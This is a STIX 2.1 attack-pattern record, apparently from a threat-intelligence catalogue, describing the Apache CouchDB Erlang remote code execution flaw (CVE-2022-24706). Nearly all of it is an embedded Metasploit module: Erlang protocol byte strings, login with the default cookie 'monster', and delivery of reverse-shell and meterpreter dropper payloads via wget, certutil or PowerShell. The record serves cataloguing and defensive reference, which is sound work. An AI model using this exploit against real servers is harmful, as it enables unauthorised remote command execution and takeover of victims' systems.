{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aade22c1-35ac-4563-b42c-fea015430000",
    "created": "2024-08-14T17:10:16.310364Z",
    "modified": "2024-08-14T17:10:16.310368Z",
    "name": "Apache Couchdb Erlang RCE",
    "description": " In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without authenticating and gain admin privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_couchdb_erlang_rce.rb",
            "external_id": "apache_couchdb_erlang_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24706"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Retry\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n  require 'msf/core/exploit/powershell'\n  require 'digest'\n\n  # Constants required for communicating over the Erlang protocol defined here:\n  # https://www.erlang.org/doc/apps/erts/erl_dist_protocol.html\n  EPM_NAME_CMD = \"\\x00\\x01\\x6e\".freeze\n  NAME_MSG = \"\\x00\\x15n\\x00\\x07\\x00\\x03\\x49\\x9cAAAAAA@AAAAAAA\".freeze\n  CHALLENGE_REPLY = \"\\x00\\x15r\\x01\\x02\\x03\\x04\".freeze\n  CTRL_DATA = \"\\x83h\\x04a\\x06gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00w\\x00w\\x03rex\".freeze\n  COOKIE = 'monster'.freeze\n  COMMAND_PREFIX = \"\\x83h\\x02gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00h\\x05w\\x04callw\\x02osw\\x03cmdl\\x00\\x00\\x00\\x01k\".freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Couchdb Erlang RCE',\n        'Description' => %q{\n          In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without\n          authenticating and gain admin privileges.\n        },\n        'Author'\t=> [\n          'Milton Valencia (wetw0rk)', # Erlang Cookie RCE discovery\n          '1F98D',                     # Erlang Cookie RCE exploit\n          'Konstantin Burov',          # Apache CouchDB Erlang Cookie exploit\n          '_sadshade',                 # Apache CouchDB Erlang Cookie exploit\n          'jheysel-r7',                # Msf Module\n        ],\n        'References' => [\n          [ 'EDB', '49418' ],\n          [ 'URL', 'https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit'],\n          [ 'CVE', '2022-24706'],\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['win', 'linux'],\n        'Payload' => {\n          'MaxSize' => 60000 # Due to the 16-bit nature of the cmd in the compile_cmd method\n        },\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => :wget,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'CmdStagerFlavor' => :certutil,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'CmdStagerFlavor' => :certutil,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2022-01-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      ),\n    )\n\n    register_options(\n      [\n        Opt::RPORT(4369)\n      ]\n    )\n  end\n\n  def check\n    erlang_ports = get_erlang_ports\n    # If get_erlang_ports does not return an array of port numbers, the target is not vulnerable.\n    return Exploit::CheckCode::Safe('This endpoint does not appear to expose any erlang ports') if erlang_ports.empty?\n\n    erlang_ports.each do |erlang_port|\n      # If connect_to_erlang_server returns a socket, it means authentication with the default cookie has been\n      # successful and the target as well as the specific socket used in this instance is vulnerable\n      sock = connect_to_erlang_server(erlang_port.to_i)\n      if sock.instance_of?(Socket)\n        @vulnerable_socket = sock\n        return Exploit::CheckCode::Vulnerable('Successfully connected to the Erlang Server with cookie: \"monster\"')\n      else\n        next\n      end\n    end\n    Exploit::CheckCode::Safe('This endpoint has an exposed erlang port(s) but appears to be a patched')\n  end\n\n  # Connect to the Erlang Port Mapper Daemon to collect port numbers of running Erlang servers\n  #\n  # @return [Array] An array of port numbers for discovered Erlang Servers.\n  def get_erlang_ports\n    erlang_ports = []\n    begin\n      print_status(\"Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: #{datastore['RHOSTS']}:#{datastore['RPORT']}...\")\n      connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => datastore['RPORT'] })\n      # request Erlang nodes\n      sock.put(EPM_NAME_CMD)\n      sleep datastore['WfsDelay']\n      res = sock.get_once\n      unless res && res.include?(\"\\x00\\x00\\x11\\x11name couchdb\")\n        print_error('Did not find any Erlang nodes')\n        return erlang_ports\n      end\n\n      print_status('Successfully found EDPM socket')\n      res.each_line do |line|\n        erlang_ports << line.match(/\\s(\\d+$)/)[0]\n      end\n    rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e\n      print_error(\"Error connecting to EDPM: #{e.class} #{e}\")\n      disconnect\n      return erlang_ports\n    end\n    erlang_ports\n  end\n\n  # Attempts to connect to an erlang server with a default erlang cookie of 'monster', which is the\n  # default erlang cookie value in Apache CouchDB installations before 3.2.2\n  #\n  # @return [Socket] Returns a socket that is connected and already authenticated to the vulnerable Apache CouchDB Erlang Server\n  def connect_to_erlang_server(erlang_port)\n    print_status('Attempting to connect to the Erlang Server with an Erlang Server Cookie value of \"monster\" (default in vulnerable instances of Apache CouchDB)...')\n    connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => erlang_port })\n    print_status('Connection successful')\n    challenge = retry_until_truthy(timeout: 60) do\n      sock.put(NAME_MSG)\n      sock.get_once(5) # ok message\n      sock.get_once\n    end\n    # The expected successful response from the target should start with \\x00\\x1C\n    unless challenge && challenge.include?(\"\\x00\\x1C\")\n      print_error('Connecting to the Erlang server was unsuccessful')\n      return\n    end\n\n    challenge = challenge[9..12].unpack('N*')[0]\n    challenge_reply = \"\\x00\\x15r\\x01\\x02\\x03\\x04\"\n    md5 = Digest::MD5.new\n    md5.update(COOKIE + challenge.to_s)\n    challenge_reply << [md5.hexdigest].pack('H*')\n    sock.put(challenge_reply)\n    sleep datastore['WfsDelay']\n    challenge_response = sock.get_once\n\n    if challenge_response.nil?\n      print_error('Authentication was unsuccessful')\n      return\n    end\n    print_status('Erlang challenge and response completed successfully')\n\n    sock\n  rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e\n    print_error(\"Error when connecting to Erlang Server: #{e.class} #{e} \")\n    disconnect\n    return\n  end\n\n  def compile_cmd(cmd)\n    msg = ''\n    msg << COMMAND_PREFIX\n    msg << [cmd.length].pack('S>')\n    msg << cmd\n    msg << \"jw\\x04user\"\n    payload = (\"\\x70\" + CTRL_DATA + msg)\n    ([payload.size].pack('N*') + payload)\n  end\n\n  def execute_command(cmd, opts = {})\n    payload = compile_cmd(cmd)\n    print_status('Sending payload... ')\n    opts[:sock].put(payload)\n    sleep datastore['WfsDelay']\n  end\n\n  def exploit_socket(sock)\n    case target['Type']\n    when :unix_cmd, :win_cmd\n      execute_command(payload.encoded, { sock: sock })\n    when :linux_dropper, :win_dropper\n      execute_cmdstager({ sock: sock })\n    when :psh_stager\n      execute_command(cmd_psh_payload(payload.encoded, payload_instance.arch.first), { sock: sock })\n    else\n      fail_with(Failure::BadConfig, 'Invalid target specified')\n    end\n  end\n\n  def exploit\n    # If the check method has already been run, use the vulnerable socket that has already been identified\n    if @vulnerable_socket\n      exploit_socket(@vulnerable_socket)\n    else\n      erlang_ports = get_erlang_ports\n      fail_with(Failure::BadConfig, 'This endpoint does not appear to expose any erlang ports') unless erlang_ports.instance_of?(Array)\n\n      erlang_ports.each do |erlang_port|\n        sock = connect_to_erlang_server(erlang_port.to_i)\n        next unless sock.instance_of?(Socket)\n\n        exploit_socket(sock)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-01-21",
    "x_mitre_platforms": [
        "win'"
    ]
}